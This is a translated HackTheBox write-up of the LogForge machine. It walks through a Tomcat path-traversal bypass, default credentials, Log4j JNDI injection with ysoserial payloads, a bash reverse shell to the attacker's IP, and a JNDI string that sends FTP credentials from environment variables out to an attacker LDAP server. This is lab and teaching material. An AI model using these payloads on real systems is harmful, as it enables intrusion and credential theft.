# 来自 HackTheBox 的 LogForge 详细演练

> 原文：<https://infosecwriteups.com/logforge-from-hackthebox-detailed-walkthrough-9c3a921a9171?source=collection_archive---------1----------------------->

展示完成盒子所需的所有工具和技术。

# 机器信息

![](img/b7039ff6c791f2bc70f7f3f682fd151e.png)

HackTheBox 的 LogForge

LogForge 是 HackTheBox 上的中型机器。由 [Ippsec](https://twitter.com/ippsec) 为 2021 年 12 月 [UHC](https://en.hackingesports.com.br/uhc) 总决赛创建，它专注于利用 Log4j 中的漏洞。

我们从一个简单的网站开始，在这里我们使用路径遍历和默认凭证来访问 Tomcat 应用程序管理器。在那里，我们使用 JNDI 查询来实现远程代码执行，并最终获得一个反向外壳。升级到 root 用户是通过反编译服务器上基于 Java 的 FTP 应用程序实现的，然后在其中使用 JNDI 查询来揭示包含用户名和密码的环境变量。

所需的技能是网络和操作系统枚举，研究和操纵利用。学到的技能是利用 JNDI 漏洞和 JAVA 反序列化攻击。

[](https://www.hackthebox.com/home/machines/profile/428) [## 破解盒子::渗透测试实验室— LogForge

### 登录 Hack The Box 平台，让您的笔测试和网络安全技能更上一层楼！

www.hackthebox.com](https://www.hackthebox.com/home/machines/profile/428) 

# 初步侦察

像往常一样，让我们从 Nmap 开始:

![](img/f575ac89fa953290cdf80d6c2e06fca3.png)

Nmap TCP 端口扫描

我们看到两个开放端口，SSH 在 22 上，HTTP 在 80 上，两个过滤端口 FTP 在 21 上，另一个 HTTP 服务在 8080 上。让我们先来看看 Apache:

![](img/945f24cd4b144fd430d34275a9d6c26b.png)

端口 80 上的网站

# Feroxbuster

我们只找到一张图片，查看源代码，这里没有什么有趣的东西。让我们尝试模糊隐藏文件夹:

![](img/c5a436a8353058cc2e54fb2a251542f0.png)

Feroxbuster 扫描隐藏文件夹

它发现了几个文件夹，我们看到禁止从端口 80 访问:

![](img/4245b7b8f162acc5ab17ce2bffc03da3.png)

禁止访问经理

有趣的是，试图访问不存在的东西显示 Tomcat 正在运行:

![](img/88ebb337d3369e488092a20f2ceaa189.png)

在端口 8080 上运行的 Tomcat

我们可以假设 Tomcat 运行在它的默认端口 8080 上，Apache 正在重定向到它。

# 路径遍历

有了这个知识，我们可以使用在另一个叫做[密封](https://pencer.io/ctf/ctf-htb-seal/#path-traversal)的 HTB 盒上使用的同样的旁路技术。这里详细的[我们可以简单地使用](https://www.acunetix.com/vulnerabilities/web/tomcat-path-traversal-via-reverse-proxy-mapping/)..；在我们不存在的路径之后，然后放入我们想要访问的文件夹，在这里我们试图到达管理器:

![](img/314faaea5516546bf5ae71b82f6783b7.png)

Tomcat 管理器登录旁路

tomcat 管理器应用程序的登录框弹出，使用 tomcat 的默认凭证:Tomcat 让我们进入:

![](img/1feb9b44cd427b98c1217e17b4ce6479.png)

Tomcat Web 应用程序管理器

我试着上传一个 msfvenom 生成的 war 文件，就像我们在 Seal box [这里](https://pencer.io/ctf/ctf-htb-seal/#msfvenom)所做的一样，但是这个方法被 1kb 的文件大小限制阻止了。这个盒子叫做 LogForge，所以我们可以安全地假设我们的路径现在正在使用 log4j 漏洞进行。

# 利用 JNDI 查询

如果你在未来的某个时候读到这篇文章，希望事情已经平息了，但现在 log4j 和利用 JNDI 的漏洞已经遍布互联网。如果你需要的话，可以在这里[和](https://docs.oracle.com/javase/jndi/tutorial/getStarted/overview/index.html)[这里](https://thenewstack.io/log4shell-we-are-in-so-much-trouble/)读一点。Reddit [上还有一个很好的资源，这里有一个](https://www.reddit.com/r/sysadmin/comments/reqc6f/log4j_0day_being_exploited_mega_thread_overview/)的例子，其中包括试图利用这个漏洞时可以尝试的 JNDI 查询。

我将简单地开始，并尝试使用以下查询通过 ldap 让机器联系我:

```
${jndi:ldap://10.10.14.12/pencer}
```

在 Kali 上启动 nc 监听，然后尝试将上面的内容粘贴到我们在 Tomcat Manager 应用程序上找到的各个字段中:

![](img/38ce314b43f9e5fa294a47ca8c3239ae.png)

测试 JNDI 漏洞

粘贴并按下 Expire Sessions 按钮后，切换到 Kali 上的 nc:

```
┌──(root💀kali)-[~/htb/logforge]
└─# nc -nlvp 389
listening on [any] 389 ...
connect to [10.10.14.12] from (UNKNOWN) [10.10.11.138] 48504
0
 `�
```

这些字符证明服务器试图通过 LDAP 在端口 389 上连接到我们。我们也可以用 curl 代替浏览器来做这件事，就像我们在 box [Dynstr](https://pencer.io/ctf/ctf-htb-dynstr/#api-investigation) 上做的那样:

```
┌──(root💀kali)-[~]
└─# curl "http://10.10.11.138/pencer/..;/manager/html/expire?path=/" --data-binary "idle=\${jndi:ldap://10.10.14.12/pencer}" 
-H "Authorization: Basic dG9tY2F0OnRvbWNhdA=="
```

注意，在用 curl 做这件事的时候，我对用户名和密码进行了 base64 编码，所以它可以在头中传递。

为了能够利用这一点，我们需要一个 LDAP 服务器等待 Kali。我们还需要一种与 JNDI 交互的方式，以便能够将 Java 有效载荷发送回来。

# JNDI 漏洞工具包

幸运的是，我们有[这套](https://github.com/pimps/JNDI-Exploit-Kit)神奇的装备。让我们抓住它看一看:

```
┌──(root💀kali)-[~/htb/logforge]
└─# git clone https://github.com/pimps/JNDI-Exploit-Kit.git
Cloning into 'JNDI-Exploit-Kit'...
remote: Enumerating objects: 328, done.
remote: Counting objects: 100% (328/328), done.
remote: Compressing objects: 100% (232/232), done.
remote: Total 328 (delta 123), reused 230 (delta 61), pack-reused 0
Receiving objects: 100% (328/328), 27.74 MiB | 10.42 MiB/s, done.
Resolving deltas: 100% (123/123), done.

┌──(root💀kali)-[~/htb/logforge]
└─# cd JNDI-Exploit-Kit
```

![](img/b9fcb2beaf021a0d5dafd9d48de79263.png)

JNDI 漏洞工具包

# YSOSerial

原始漏洞利用工具包的这个分支支持一个 YSOSerial 二进制有效载荷。让我们抓住 YSOSerial 的[修改版本](https://github.com/pimps/ysoserial-modified)，因为它支持多个命令，这将使我们的反向 shell 有效负载更容易:

```
┌──(root💀kali)-[~/htb/logforge]
└─# git clone https://github.com/pimps/ysoserial-modified.git
Cloning into 'ysoserial-modified'...
remote: Enumerating objects: 324, done.
remote: Total 324 (delta 0), reused 0 (delta 0), pack-reused 324
Receiving objects: 100% (324/324), 84.22 MiB | 15.72 MiB/s, done.
Resolving deltas: 100% (94/94), done.

┌──(root💀kali)-[~/htb/logforge]
└─# cd ysoserial-modified/target┌──(root💀kali)-[~/htb/logforge/ysoserial-modified/target]
└─# java -jar ysoserial-modified.jar -h
Y SO SERIAL?
Usage: java -jar ysoserial-[version]-all.jar [payload type] [terminal type: cmd / bash / powershell / none] '[command to execute]'
   ex: java -jar ysoserial-[version]-all.jar CommonsCollections5 bash 'touch /tmp/ysoserial'
        Available payload types:
                BeanShell1 [org.beanshell:bsh:2.0b5]
                C3P0 [com.mchange:c3p0:0.9.5.2, com.mchange:mchange-commons-java:0.2.11]
                CommonsBeanutils1 [commons-beanutils:commons-beanutils:1.9.2, commons-collections:commons-collections:3.1, commons-logging:commons-logging:1.2]
                CommonsCollections1 [commons-collections:commons-collections:3.1]
                CommonsCollections2 [org.apache.commons:commons-collections4:4.0]
                CommonsCollections3 [commons-collections:commons-collections:3.1]
                CommonsCollections4 [org.apache.commons:commons-collections4:4.0]
                CommonsCollections5 [commons-collections:commons-collections:3.1]
<SNIP>
```

YSOSerial 非常全面，HackTricks 在这里有一些关于反序列化概念和使用 YSOSerial 来利用这种攻击方法的有用信息。根据工具描述:

```
ysoserial is a collection of utilities and property-oriented programming "gadget chains" discovered in common java libraries that can, under the right conditions, exploit Java applications performing unsafe de-serialization of objects.
```

这里的关键点是，它利用目标应用程序上可能已经存在的公共代码，允许我们执行自己的代码。

# Java 反序列化攻击

让我们创建一个简单的有效负载，它将从机器上 ping 我:

```
┌──(root💀kali)-[~/htb/logforge]
└─# java -jar ysoserial-modified/target/ysoserial-modified.jar CommonsCollections5 bash 'ping -c 4 10.10.14.12' > pencer.serWARNING: An illegal reflective access operation has occurred
WARNING: Illegal reflective access by ysoserial.payloads.CommonsCollections5 (file:/root/htb/logforge/ysoserial-modified/target/ysoserial-modified.jar) to field javax.management.BadAttributeValueExpException.val
WARNING: Please consider reporting this to the maintainers of ysoserial.payloads.CommonsCollections5
WARNING: Use --illegal-access=warn to enable warnings of further illegal reflective access operations
WARNING: All illegal access operations will be denied in a future release
```

忽略警告，因为这很正常。上面创建了一个名为 pencer.ser 的文件，该文件一旦在目标上反序列化，就会尝试 ping 我的 Kali IP 四次。对于这个盒子，我使用了 CommonsCollections5，你可能需要尝试几个不同的，直到你得到一个可以在另一个盒子上工作的。接下来启动 JNDI 漏洞利用工具包，告诉它有效负载是我的 pencer.ser 文件，并使用我的 Kali tun0 IP 在端口 389 上启动 LDAP 服务器:

![](img/94252d52d23a5a2852fbd85b4b92b4c4.png)

JNDI 漏洞利用工具包服务器 pencer.ser 有效负载

如您所见，根据我们正在处理的 JDK 版本，不同的环境有不同的目标。你可能需要反复试验才能找到适合你的另一个盒子。

在那个列表中，这是我使用的一个:

```
Target environment(Build in JDK 1.5 whose trustURLCodebase is true):
rmi://10.10.14.12:1099/u3rmld
ldap://10.10.14.12:389/u3rmld
```

接下来，在另一个终端中启动 tcpdump 侦听 ICMP 数据包，以捕获来自机器的 ping:

```
┌──(root💀kali)-[~]
└─# tcpdump -ni tun0 icmp
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
```

现在，我们可以像以前一样使用 curl 来触发 JNDI 漏洞利用，但这一次我们将它指向 JNDI 漏洞利用工具包托管的目标，所以使用我们从上面选择的那个:

```
┌──(root💀kali)-[~/htb/logforge]
└─# curl "http://10.10.11.138/pencer/..;/manager/html/expire?path=/" --data-binary "idle=\${jndi:ldap://10.10.14.12:389/u3rmld}" 
-H "Authorization: Basic dG9tY2F0OnRvbWNhdA=="
```

切换到 tcpdump 查看 ping:

![](img/2f68dd12672ce5169ec69e142f648ec5.png)

对 ping 使用 JNDI 漏洞的响应

如果您回头看看我们使用 exploit kit 运行的 LDAP 服务器，我们会看到连接，我们的响应是传递 pencer.ser 有效负载:

![](img/664ee0adea73acc188f23a254725a82d.png)

JNDI 漏洞利用工具包 LDAP 服务器响应有效负载

这证实了我们可以在服务器上远程执行代码。让我们给自己弄一个反向 shell，使用 PentestMonkey 的一个简单的 shell，就像我们在 [Dynstr](https://pencer.io/ctf/ctf-htb-dynstr/#reverse-shell) 上做的一样:

```
bash -i >& /dev/tcp/10.10.14.12/1337 0>&1
```

使用 YSOSerial 再次创建我们的有效负载:

```
┌──(root💀kali)-[~/htb/logforge]
└─# java -jar ysoserial-modified/target/ysoserial-modified.jar CommonsCollections5 bash 'bash -i >& /dev/tcp/10.10.14.12/1337 0>&1' > shell.ser
```

停止 tcpdump 并在端口 1337 上启动 netcat 侦听。停止 JNDI 利用工具包，并开始再次与我们新的反向外壳有效载荷:

```
┌──(root💀kali)-[~/htb/logforge]
└─# java -jar JNDI-Exploit-Kit/target/JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -P ysoserial-modified/target/shell.ser -L 10.10.14.12:389
```

记下新的目标 URL:

```
Target environment(Build in JDK 1.5 whose trustURLCodebase is true):
rmi://10.10.14.12:1099/ry0f9s
ldap://10.10.14.12:389/ry0f9s
```

像我们之前做的一样，使用 curl 来触发攻击:

```
┌──(root💀kali)-[~/htb/logforge]
└─# curl "http://10.10.11.138/pencer/..;/manager/html/expire?path=/" --data-binary "idle=\${jndi:ldap://10.10.14.12:389/ry0f9s}" 
-H "Authorization: Basic dG9tY2F0OnRvbWNhdA=="
```

# 反向外壳

如果一切顺利，切换到 nc 监听器来查看我们的 shell 连接:

```
┌──(root💀kali)-[~]
└─# nc -nlvp 1337
listening on [any] 1337 ...
connect to [10.10.14.12] from (UNKNOWN) [10.10.11.138] 49842
bash: cannot set terminal process group (776): Inappropriate ioctl for device
bash: no job control in this shell
tomcat@LogForge:/var/lib/tomcat9$
```

在我们继续之前，让我们对 shell 进行通常的升级，以使它更容易使用:

```
tomcat@LogForge:/var/lib/tomcat9$ python3 -c 'import pty;pty.spawn("/bin/bash")'
tomcat@LogForge:/var/lib/tomcat9$ ^Z
zsh: suspended  nc -nlvp 1337
┌──(root💀kali)-[~]
└─# stty raw -echo; fg
[1]  + continued  nc -nlvp 1337
tomcat@LogForge:/var/lib/tomcat9$ stty rows 52 cols 237
tomcat@LogForge:/var/lib/tomcat9$ export TERM=xterm
```

如果你需要参考，我的博客上有这些。

# 用户标志

让我们先抓住用户标志:

```
tomcat@LogForge:/var/lib/tomcat9$ cat /home/htb/user.txt 
<HIDDEN>
```

# 列举

回到这个框的开头，我们在 nmap 扫描中看到了端口 21。现在我们在盒子上，我们可以看看它:

![](img/6759036d7dcb2da6a351cad5dc3a63ea.png)

act 的 netstat 输出

Netstat 显示有东西在监听 21 号端口。我们知道这是 FTP 的默认端口，让我们看看正在运行的进程:

```
tomcat@LogForge:/var/lib/tomcat9$ ps -ax | grep ftp
 993 ?  Sl  0:26 java -jar /root/ftpServer-1.0-SNAPSHOT-all.jar
```

# Java FTP 服务器

这告诉我们看起来有一个基于 java 的 ftpserver 在根文件夹中运行。我们可以在本地连接到它:

```
tomcat@LogForge:/var/lib/tomcat9$ ftp localhost
Connected to localhost.
220 Welcome to the FTP-Server
Name (localhost:tomcat): 
530 Not logged in
Login failed.
Remote system type is FTP.
ftp>
```

奇怪的是，我刚刚在名称字段按了 enter，它显示登录失败，但实际上我在:

```
ftp> ls
200 Command OK
125 Opening ASCII mode data connection for file list.
.profile
.ssh
snap
ftpServer-1.0-SNAPSHOT-all.jar
.bashrc
.selected_editor
run.sh
.lesshst
.bash_history
root.txt
.viminfo
.cache
226 Transfer complete.
```

# 根标志(非预期)

我们看到了根旗。我可以得到它并完成这个盒子:

```
ftp> get root.txt
local: root.txt remote: root.txt
200 Command OK
150 Opening ASCII mode data connection for requested file root.txt
WARNING! 1 bare linefeeds received in ASCII mode
File may not have transferred correctly.
226 File transfer successful. Closing data connection.
33 bytes received in 0.00 secs (86.8641 kB/s)
ftp> quit
221 Closing connection

tomcat@LogForge:/tmp$ cat root.txt 
<HIDDEN>
```

# 预期路径

事实证明这是无意的，所以为了按照 Ippsec 的计划完成这个盒子，让我们获取 ftp 服务器 jar 文件，并在 Kali 上查看它。

我们无法从/root 中获得它，但是如果我们查看，我们会发现它在文件系统的其他地方:

```
tomcat@LogForge:/var/lib/tomcat9$ locate ftpServer-1.0-SNAPSHOT-all.jar
/ftpServer-1.0-SNAPSHOT-all.jar
/root/ftpServer-1.0-SNAPSHOT-all.jar
```

为了进行渗透，我们可以在机器上启动 Python web 服务器:

```
tomcat@LogForge:/$ python3 -m http.server 1338
Serving HTTP on 0.0.0.0 port 1338 (http://0.0.0.0:1338/) ...
```

现在把它从 Kali 那边拉过来:

![](img/b1f10621309f128386c79e21a250fcbc.png)

从盒子中取出 ftpserver

# JD-GUI

我们可以反汇编 jar 文件，看看 FTP 服务器应用程序是如何工作的。有很多工具可以完成这项任务，包括[这个](https://www.javatpoint.com/java-decompiler)方便的在线工具，加上[这篇](https://www.javatpoint.com/java-decompiler)文章中提到的几个工具。对于 Kali，我们可以使用 JD-GUI，因为它包含在易于安装的存储库中:

```
┌──(root💀kali)-[~/htb/logforge]
└─# jd-gui
Command 'jd-gui' not found, but can be installed with:
apt install jd-gui
Do you want to install it? (N/y)y
apt install jd-gui
Reading package lists... Done
Building dependency tree... Done
Reading state information... Done
The following NEW packages will be installed:
  jd-gui
0 upgraded, 1 newly installed, 0 to remove and 314 not upgraded.
Need to get 1,287 kB of archives.
After this operation, 1500kB of additional disk space will be used.
Get:1 http://kali.download/kali kali-rolling/main amd64 jd-gui all
Fetched 1,287 kB in 1s (1,445 kB/s)
Selecting previously unselected package jd-gui.
Preparing to unpack .../jd-gui_1.6.6-0kali1_all.deb ...
Unpacking jd-gui (1.6.6-0kali1) ...
Setting up jd-gui (1.6.6-0kali1) ...
Processing triggers for kali-menu (2021.4.2) ...
```

现在，在您的终端中键入 jd-gui 来打开应用程序。然后从文件菜单中选择打开文件，并选择我们复制的 ftpServer-1.0-SNAPSHOT-all.jar:

![](img/3710bab95a36ef3c47e9e6ace4944a1d.png)

使用 JD-GUI 反编译应用程序

环顾四周，我们看到两件有趣的事情。首先，很明显 log4j 在这个 FTP 服务器中用于日志记录，因为你可以在类中看到许多配置文件和对它的引用。其次，在工人阶级中，我们看到:

![](img/d1f21e1b31673bcf88722ee26678b8d2.png)

检查 worker.class 揭示环境变量

这告诉我们 validUser 和 validPassword 保存在名为 ftp_user 和 ftp_password 的环境变量中。[这](https://www.tutorialspoint.com/java/lang/system_getenv_string.htm)是一篇解释环境变量在 Java 中如何工作的好文章。

# FTP JNDI 漏洞 1

我们可以像以前一样使用 JNDI 漏洞工具包来利用这一点来公开变量的值。检查它是否仍在运行，如果没有，请再次启动它:

```
┌──(root💀kali)-[~/htb/logforge]
└─# java -jar JNDI-Exploit-Kit/target/JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -P ysoserial-modified/target/shell.ser -L 10.10.14.12:389
```

如果您不熟悉 tshark，它是 Wireshark 的命令行版本。请看官方文档[这里](https://www.wireshark.org/docs/wsug_html_chunked/AppToolstshark.html)和[这个](https://hackertarget.com/tshark-tutorial-and-filter-examples/)给了我们几个例子来帮助理解如何使用它。

启动 tshark 来捕获网络上的流量，以备我们的流氓 LDAP 服务器响应它将从机器中接收的 JNDI 请求时使用:

```
┌──(root💀kali)-[~/htb/logforge]
└─# tshark -i tun0 -w capture-output.pcap             
Running as user "root" and group "root". This could be dangerous.
Capturing on 'tun0'
```

现在切换回盒子，启动 ftp 服务器，我们可以使用我们之前用来获取用户名和密码的 JNDI 字符串的变体:

```
${jndi:ldap://10.10.14.12:389/PENCER--USER:${env:ftp_user}:PASSWORD:${env:ftp_password}}
```

当 FTP 在机器上启动时，只需将它粘贴到名称字段中:

![](img/a2a307c1f5bf613f0c242994bb036f01.png)

利用 JNDI 漏洞暴露环境变量

那个 JNDI 字符串将像以前一样回调我们在端口 389 上的 Kali LDAP 服务器，这次它为 ftp_user 和 ftp_password 传递环境变量。当它们被传递给我们时，它们将被转换成这些变量的实际值，这样我们就可以看到它们是什么了。

切换回 tshark 和 ctrl-z 以停止捕获，然后我们可以读取 pcap 文件并过滤 tcp.port == 389 以查看 LDAP 流量:

![](img/dd2d9dde56f1c9cec7d78b223a2266a3.png)

tshark 捕获环境变量的内容以揭示凭证

通过将 PENCER 放入字符串中，我们可以很容易地在输出中看到它。我们还可以 grep 来显示我们感兴趣的行:

![](img/835943e43f412d007c31d338fa81d6f8.png)

tshark 的 Grepped 输出便于查看

所以我们找到了用户名和密码。我们现在可以切换回机器，正确登录并再次获得根标志:

```
tomcat@LogForge:/tmp$ ftp localhost
Connected to localhost.
220 Welcome to the FTP-Server
Name (localhost:tomcat): ippsec
331 User name okay, need password
Password:
230-Welcome to HKUST
230 User logged in successfully
Remote system type is FTP.
ftp> get root.txt
local: root.txt remote: root.txt
200 Command OK
150 Opening ASCII mode data connection for requested file root.txt
WARNING! 1 bare linefeeds received in ASCII mode
File may not have transferred correctly.
226 File transfer successful. Closing data connection.
33 bytes received in 0.00 secs (49.5032 kB/s)
ftp> exit
221 Closing connection
tomcat@LogForge:/tmp$ cat root.txt 
<HIDDEN>
```

# FTP JNDI 漏洞 2

我们还可以做另外一件事，而不是使用 tshark 来捕获流氓 LDAP 服务器作为有效负载发送的流量。这实际上要容易得多，我们只需在 389 端口监听 JNDI 漏洞利用工具包，但没有有效载荷。使用与之前相同的 JNDI 查询作为 FTP 用户名，当您切换回 Kali 时，您会看到我们有我们想要的:

![](img/14ff8931d0cff7a32036f794d48ac77f.png)

JNDI 漏洞工具包暴露凭据

正如你所看到的，当它从盒子里收到 JNDI 字符串时，它不知道如何处理它，因为没有设置有效载荷来响应。有益的是，它向我们显示了收到的内容，包括那些扩展的变量，这样我们就可以看到它们的内容。

这是在这个盒子上获得根标志的三种方法。希望你喜欢，下次见。

如果你喜欢这篇文章，请给我一两个掌声(这是免费的！)

推特—[https://twitter.com/pencer_io](https://twitter.com/pencer_io)
网站— [https://pencer.io](https://pencer.io/)

*原载于 2022 年 1 月 2 日*[*https://pencer . io*](https://pencer.io/ctf/ctf-htb-logforge/)*。*